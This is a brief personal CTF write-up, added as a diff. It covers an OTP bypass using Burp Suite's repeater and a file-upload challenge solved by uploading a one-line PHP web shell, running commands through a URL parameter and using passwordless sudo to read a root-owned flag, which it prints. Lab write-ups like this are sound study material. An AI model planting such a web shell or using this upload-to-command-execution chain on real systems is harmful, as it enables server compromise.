@@ -1,0 +1,54 @@
+writeup
+
+INTROTOBURP
+
+1. I STARTED UP BURPSUITE
+2. WENT TO PROXY AND EXAMINED HTTP HISTORY
+3. we want to bypass otp, so i go to my last request (a post request to a txt file. 
+4. copy otp input, change otp to anything, send to repeater, 
+5. go to repeater tab send action and render page, flag is there.
+
+NOS4NITY1
+locate the file upload and find hidden flag in /root directory.
+
+hint. file not sanitized
+
+1 I uploaded a file (txt) and response showed folder location. and uploads.php.
+
+2. i tried to change url to take to the folder directly.
+3. created a webshell by creating shell.php document with the following script: <?php system($_GET['cmd']); ?>
+4. uploaded the shell and navigated to the file location.
+
+5. I got a warning, but it provided the file location: /var/www/html/uploads/shell.php 
+6. Now I can execute commands by the url by including ?cmd=id ---> uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+cmd=ls -l /root --> cant access
+7. lets see if we can use sudo... cmd =sudo -l
+	user www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL --this means we can use sudo commands without passwords.
+	
+	8. lets use sudo to look at root directory: cmd=sudo ls /root
+	---> found flag.txt
+	9. lets open the file: cmd= sudo cat /root/flag.txt
+	10. found picoCTF{wh47_c4n_u_d0_wPHP_d698d800}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
